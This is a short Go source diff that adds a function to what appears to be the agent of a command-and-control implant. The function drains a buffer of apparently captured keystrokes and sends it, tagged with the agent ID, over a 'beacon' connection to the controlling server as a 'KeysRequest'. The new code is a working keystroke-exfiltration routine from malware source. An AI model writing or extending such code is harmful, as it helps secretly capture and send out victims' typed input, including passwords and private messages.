@@ -236,3 +236,40 @@ func handleKeysRequest(beacon io.ReadWriteCloser, agentID string) error {
 	cache = ""
 	return nil
 }
+
+func handleCacheSocketRequest(beacon io.ReadWriteCloser, agentID string, mu *sync.Mutex, builder *strings.Builder) error {
+	mu.Lock()
+
+	if builder.Len() == 0 {
+		logger.Logf(logger.Info, "No logs to send, skipping socket cache request")
+		mu.Unlock()
+		return nil
+	}
+
+	data := builder.String()
+	builder.Reset()
+	mu.Unlock()
+
+	logger.Logf(logger.Info, "Sending cache data: %v", data)
+
+	req := &patronobuf.Request{
+		Type: patronobuf.RequestType_KEYS,
+		Payload: &patronobuf.Request_Keys{
+			Keys: &patronobuf.KeysRequest{
+				Uuid: agentID,
+				Keys: data,
+			},
+		},
+	}
+
+	if err := common.WriteDelimited(beacon, req); err != nil {
+		return fmt.Errorf("failed to send keys request: %w", err)
+	}
+
+	resp := &patronobuf.Response{}
+	if err := common.ReadDelimited(beacon, resp); err != nil {
+		return fmt.Errorf("failed to read keys response: %w", err)
+	}
+
+	return nil
+}
